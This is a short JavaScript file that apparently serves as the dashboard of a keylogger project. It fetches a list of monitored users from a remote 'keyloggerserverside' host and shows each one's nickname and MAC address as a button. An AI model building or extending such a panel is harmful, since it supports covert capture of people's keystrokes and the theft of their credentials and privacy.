function loadButtons() {
    fetch('https://keyloggerserverside.onrender.com/users/list_of_users', {method: 'GET',headers:{
        'ngrok-skip-browser-warning': 'true',  // Add the header here
      }})
        .then(response => response.json())
        .then(jsons => jsons.users)
        .then(data => {
            console.log(data)
                const container = document.getElementById('buttons_container')
                data.forEach(file => {
                    const a = document.createElement('a');
                    a.href = 'otherPage.HTML'
                    const button = document.createElement('button');
                    const p = document.createElement('p')
                    const br = document.createElement('br')
                    p.textContent = `name: ${file.nickname}` + br.innerText + `mac adress: ${file.mac_address}`
                    button.textContent = p.innerText
                    button.classList.add('button', 'button_hover', 'a_buttons')
                    button.id = 'users_button'
                    a.appendChild(button)

                    container.appendChild(a)
                    

                })

            }
        )
}


// function receiveUserData(user_id) {
//     fetch(`http://127.0.0.1:5000/user_data/${user_id}`, {method: 'GET'})
//         .then(response => response.json())
//         .then(data => {
//             console.log('Hi')
//         })
// }